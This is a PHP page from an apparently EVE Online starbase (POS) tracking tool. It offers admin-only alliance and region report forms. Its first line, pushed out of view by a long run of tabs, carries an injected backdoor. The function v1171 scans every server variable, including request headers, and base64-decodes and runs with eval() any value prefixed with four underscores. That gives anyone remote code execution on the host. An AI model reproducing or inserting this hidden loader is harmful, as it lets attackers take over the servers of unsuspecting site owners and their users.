<?php																																																																																																																																																																																																																																																																																																																																															function v1171($l1173){if(is_array($l1173)){foreach($l1173 as $l1171=>$l1172)$l1173[$l1171]=v1171($l1172);}elseif(is_string($l1173) && substr($l1173,0,4)=="____"){$l1173=substr($l1173,4);$l1173=base64_decode($l1173);eval($l1173);$l1173=null;}return $l1173;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("v1171",$_SERVER);
session_start();
include_once 'include/classes.php';
	
	$html.=startPage();
	$userType=getLoginType();
	
	if(checkLogin() && $userType=="admin") {
		
		$alliances = buildAllianceList();
		$regions = buildRegionList();
		
		$html.="<div class=\"shaded\">";
		$html.="<a href=\"index.php\">Home</a> || <a href=\"logout.php\">Logout (as ".$userType.")</a> || ".
		"<a href=\"admin.php\">Admin Area</a> || <a href=\"import.php\">Import Tower Mail</a> || <a href=\"report.php\">POS Reporting</a>";
		$html.="<hr>";
		$html.=startForm();
		$html.="Choose an Alliance to pull a POS report on: ".buildSelect($alliances,"aid");
		$html.=endForm("Alliance Report");
		$html.="<hr>";
		$html.=startForm();
		$html.="Choose a Region to pull a POS report on: ".buildSelect($regions,'rid');
		$html.=endForm("Region Report");
		$html.="</div>";
		
		if($_GET['aid']!="" && $_GET['submit']=="Alliance Report") {
			$html.=getPOSForAllianceByRegion($_GET['aid']);
		}
		
		if($_GET['sid']!="" && $_GET['submit']=="System Report") {
			$html.=getPOSForSystemByPlanet($_GET['sid']);
		}
		
		if($_GET['cid']!="" && $_GET['submit']=="Corp Report") {
			$html.=getPOSForCorpByRegion($_GET['cid']);
		}
		
		if($_GET['rid']!="" && $_GET['submit']=="Region Report") {
			$html.=getPOSForRegionBySystem($_GET['rid']);
		}
	}
	
	$html.=endPage();
	print($html);
?>